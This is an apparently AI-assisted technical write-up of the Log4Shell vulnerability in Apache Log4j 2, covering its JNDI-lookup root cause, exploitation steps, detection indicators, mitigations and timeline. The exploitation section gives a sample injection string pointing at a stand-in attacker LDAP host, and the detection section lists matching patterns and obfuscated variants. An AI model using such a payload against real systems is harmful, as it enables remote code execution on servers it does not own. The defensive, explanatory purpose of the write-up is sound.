# a) Log4j (Log4Shell) — technical write-up

## Executive summary

Log4Shell (CVE-2021-44228) is a remote code execution vulnerability in Apache Log4j 2 (affecting many 2.x versions) that abuses Log4j’s JNDI lookup feature to cause an application to fetch and execute attacker-controlled Java code. It was disclosed publicly in December 2021 and produced a global, fast-moving exploitation wave because Log4j is widely embedded in Java apps and services. [CISA+1](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance?utm_source=chatgpt.com)

---

## Technical background

- **Component:** Apache Log4j 2 (logging library used by Java applications).
- **Root cause:** Unvalidated use of the Java Naming and Directory Interface (JNDI) lookup mechanism inside message formatting. When Log4j formatted a log message containing a `${jndi:...}` expression, it could perform JNDI lookups (LDAP, RMI, etc.) and deserialize/execute classes fetched via those lookups. [Dynatrace](https://www.dynatrace.com/news/blog/what-is-log4shell/?utm_source=chatgpt.com)
- **Affected versions:** Log4j 2.0-beta9 through 2.14.1 (initial advisories) — upstream patches and safe versions were later released; long-term resolution is to upgrade to a fixed Log4j 2.x release. [CISA](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance?utm_source=chatgpt.com)

---

## Exploitation mechanics (how attacks worked)

1. **Injection point:** Any loggable string that reaches Log4j’s message formatting (HTTP headers, user-agent, form parameters, protocol fields, error messages, etc.) could contain a JNDI lookup payload like:
    
    ```
    ${jndi:ldap://attacker.com/a}
    
    ```
    
2. **JNDI resolution:** Log4j processed the lookup and triggered the JVM’s JNDI subsystem to contact the specified LDAP/RMI server.
3. **Class retrieval:** The attacker’s server responded with a reference that caused the victim JVM to download a remote Java class (or return a serialized object which is subsequently loaded/executed).
4. **Remote Code Execution (RCE):** The remote class ran in the victim application's process, giving arbitrary code execution with the application's privileges. [sysdig.com+1](https://www.sysdig.com/blog/exploit-detect-mitigate-log4j-cve?utm_source=chatgpt.com)

---

## Detection / Indicators of compromise (IoCs)

- **Network indicators:** outbound LDAP/RMI/HTTP calls to uncommon external servers from Java application hosts; spikes in suspicious JNDI-related network activity. [Unit 42](https://unit42.paloaltonetworks.com/apache-log4j-vulnerability-cve-2021-44228/?utm_source=chatgpt.com)
- **Log indicators:** logged strings containing `${jndi:`, `${${lower:jndi}:...}`, or obfuscated variants (nested lookups, base64, URL-encoded forms).
- **Behavioral indicators:** unexpected JVM class downloads, new / unusual Java processes, webshells, reverse shells, or anomalies in application behavior after suspicious log entries.
- **Hunt queries:** search logs for regex patterns like `\$\{jndi:` and for DNS/LDAP requests to attacker domains.

---

## Mitigation & remediation

Short-term mitigations that were widely recommended while patches were applied:

- **Upgrade Log4j** to a patched release (follow Apache guidance — final fixed releases are the correct long-term fix). [CISA](https://www.cisa.gov/news-events/news/apache-log4j-vulnerability-guidance?utm_source=chatgpt.com)
- **If immediate upgrade not possible:** remove the `JndiLookup` class from the `log4j-core` JAR (e.g., `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`), or set JVM/system property to disable lookups if provided by the patched line. Vendor playbooks documented removal workarounds. [Dell](https://www.dell.com/support/kbdoc/en-us/000194596/how-to-remove-jndilookup-class-from-the-log4j-2-x-core-jar-file?utm_source=chatgpt.com)
- **Network controls:** block outbound LDAP/RMI from application workloads, enforce egress restrictions and DNS filtering. [sysdig.com](https://www.sysdig.com/blog/exploit-detect-mitigate-log4j-cve?utm_source=chatgpt.com)

---

## Impact & timeline (summary)

- **Discovery & disclosure:** public disclosure/patching December 2021; massive scanning and exploitation followed immediately, affecting cloud services, endpoints, and embedded devices where Log4j was present. Global telemetry showed extremely high scan/exploit volumes in the weeks after disclosure.
